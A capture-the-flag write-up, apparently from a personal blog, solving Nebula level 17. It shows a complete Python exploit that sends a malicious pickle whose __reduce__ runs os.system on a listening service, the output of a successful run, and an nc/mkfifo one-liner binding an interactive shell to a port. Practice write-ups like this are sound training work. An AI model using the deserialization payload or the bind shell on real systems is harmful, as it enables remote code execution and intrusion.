---
layout: post
title: "Vulnerability just ahead"
category: WarGame, Nebula
---

>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; **[Nebula 17](https://web.archive.org/web/20141004180714/http://exploit-exercises.com/nebula/level17) Agenda**: "There is a python script listening on port 10007 that contains a vulnerability."

<center>
	<img src="/images/2015-10-15-vulnerability_just_ahead/3200ef81de9f240f664048f7.jpg">
</center>
<br />

The first thing that catches the eye in the source, is the next line(immediately raises the question - "_whyyy?_"):
{% highlight python linenos %}
obj = pickle.loads(line)
{% endhighlight %}
This means that server expects to receive serialized(by [pickle](https://docs.python.org/2/library/pickle.html#module-pickle)) data. [Search results](https://duckduckgo.com/?q=cPickle+vulnerability&t=canonical) confirms, that module is unsafe (in the main - [\_\_reduce\_\_](https://docs.python.org/2/library/pickle.html#object.__reduce__) deserialization method). According to the docs, we need to send serialized object, that implements required routine, which in order should return something useful. In our case, a tuple with "_os.system_" as callable object argumet, and the second one(tuple's arg) should be another tuple which will serve as an callable's arg("_getflag_"):

{% highlight python linenos %}
#!/usr/bin/python
import os
import socket
import cPickle

TARGET_HOST = "0.0.0.0"
TARGET_PORT = 10007
TARGET_CMD = "getflag > /tmp/flag"

class GhostInTheShell(object):
    def __reduce__(self):
        return (os.system, (TARGET_CMD,))


def sendDataAndPrintResponse(data):    
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((TARGET_HOST, TARGET_PORT))
    sock.send(data) 

    print(sock.recv(1024))

    sock.close()


def main():
    payload = cPickle.dumps(GhostInTheShell())
    sendDataAndPrintResponse(payload)


if __name__ == "__main__":
    main()
{% endhighlight %}

{% highlight sh linenos %}
level17@nebula:~$ ./pwn.py && sleep 1 && cat /tmp/flag 
Accepted connection from 127.0.0.1:56737
You have successfully executed getflag on a target account
{% endhighlight %}

Well, if smdb needs smth more than just string output evidence(e.g. simple interactive shell 。☆°⋆＼(- – )), then smdb could grab a chunk from nc man page:

{% highlight sh linenos %}
rm -f /tmp/f; mkfifo /tmp/f && cat /tmp/f | /bin/sh -i 2>&1 | nc -l 0.0.0.0 1234 > /tmp/f
{% endhighlight %}

Resources:

 * [Python class object](https://docs.python.org/2/library/functions.html#object)
 * [What is the purpose of self in Python?](http://stackoverflow.com/questions/2709821/what-is-the-purpose-of-self-in-python)